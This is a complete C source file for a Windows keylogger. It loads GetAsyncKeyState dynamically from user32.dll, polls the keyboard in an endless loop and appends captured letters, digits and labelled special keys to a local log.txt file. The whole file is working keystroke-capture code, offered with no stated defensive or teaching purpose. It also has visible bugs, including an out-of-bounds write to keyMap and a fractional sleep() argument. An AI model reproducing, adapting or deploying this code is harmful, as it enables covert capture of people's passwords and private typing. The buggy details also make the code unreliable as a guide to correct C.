#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <strings.h>

typedef SHORT(WINAPI* Func_GetAsyncKeyState)(
    int vKey
);

char keyMap[0xA5][15];
int specialKeys[15] = { 0x08, 0x09, 0x0D, 0x14, 0x20, 0x25, 0x26, 0x27, 0x2E, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5 };
bool specialKeyState[15] = { false };
char buffer[512];
int bufferPtr = 0;
FILE* fptr;

bool isSpecialKey(int key) {
    for(int i = 0; i < 15; i++) {
        if(specialKeys[i] == key)
            return true;
    }
    return false;
}

void init() {
    strcpy(keyMap[0x08], "[BSP]"); // [BACKSPACE]
    strcpy(keyMap[0x09], "[TAB]"); // [TAB]
    strcpy(keyMap[0x0D], "[ENT]"); // [ENTER]
    strcpy(keyMap[0x14], "[CLK]"); // [CAPSLOCK]
    strcpy(keyMap[0x20], "[SPB]"); // [SPACEBAR]
    strcpy(keyMap[0x25], "[LAR]"); // [LEFT ARROW]
    strcpy(keyMap[0x26], "[UAR]"); // [UP ARROW]
    strcpy(keyMap[0x27], "[RAR]"); // [RIGHT ARROW]
    strcpy(keyMap[0x28], "[DAR]"); // [DOWN ARROW]
    strcpy(keyMap[0x2E], "[DEL]"); // [DEL]
    strcpy(keyMap[0xA0], "[LSH]"); // [LEFT SHIFT]
    strcpy(keyMap[0xA1], "[RSH]"); // [RIGHT SHIFT]
    strcpy(keyMap[0xA2], "[LCL]"); // [LEFT CONTROL]
    strcpy(keyMap[0xA3], "[RCL]"); // [RIGHT CONTOL]
    strcpy(keyMap[0xA4], "[LAL]"); // [LEFT ALT]
    strcpy(keyMap[0xA5], "[RAL]"); // [RIGHT ALT]
    for(int i = 0x30; i < 0x3A; i++)
        sprintf(keyMap[i], "%d", i - 48); 
    fptr = fopen("log.txt", "a");
    return;
}

void main(void)
{
    int curState = 0, i, A, j;
    bool keyDown = false, isSpecial;
    HMODULE hLib;
    Func_GetAsyncKeyState keyState;
    hLib = LoadLibraryA("C:\\WINDOWS\\system32\\user32.dll");
    init();

    if (hLib != NULL) {
        printf("Loaded Win32.dll library\n");
        keyState = (Func_GetAsyncKeyState)GetProcAddress(hLib, "GetAsyncKeyState");
        while(1){
            sleep(0.5);
            for(i = 0x01; i <= 0xFE; i++){
                if(
                    !(i == 0x08 ||
                    i == 0x09 ||
                    i == 0x0D ||
                    i == 0x14 ||
                    i == 0x20 ||
                    (i >= 0x25 && i <= 0x28) ||
                    i == 0x2E ||
                    (i >= 0x30 && i <= 0x39) ||
                    (i >= 0x41 && i <= 0x5A) ||
                    (i >= 0xA0 && i <= 0xA5))
                ) {
                    continue;
                }
                isSpecial = isSpecialKey(i);
                A = keyState(i);
                if(A != 0 && ((!keyDown && !isSpecial) || (isSpecial && !specialKeyState[i]))){
                    if(i >= 0x41 && i <= 0x5A) {
                        // buffer[bufferPtr++] = (char) i;
                        // printf("%c", i);
                        fprintf(fptr, "%c", (char)i);
                    } else {
                        if((isSpecial && !specialKeyState[i]) || !isSpecial){
                            // for(j = bufferPtr; j < bufferPtr + 5 ; j++) {
                            //     buffer[j] = keyMap[i][j - bufferPtr];
                            // }
                            // bufferPtr = j;
                            // printf("%s", keyMap[i]);
                            fprintf(fptr, "%s", keyMap[i]);
                        }
                    }

                    if(isSpecial && !specialKeyState[i]) {
                        specialKeyState[i] = true;
                    } else {
                        curState = i;
                        keyDown = true;
                    }
                } else if(A == 0 && curState == i) {
                    curState = 0;
                    keyDown = false;
                } else if(A == 0 && isSpecial && specialKeyState[i]) {
                    specialKeyState[i] = false;
                }
            }
            // if(bufferPtr > 100) {
            //     fptr = fopen("log.txt", "w");
            //     fprintf(fptr, "%s", buffer);
            //     fclose(fptr);
            //     bufferPtr = 0;
            //     printf("Buf : %s", buffer);
            // }
        }
    }
    FreeLibrary(hLib);
    fclose(fptr);
    return;
};

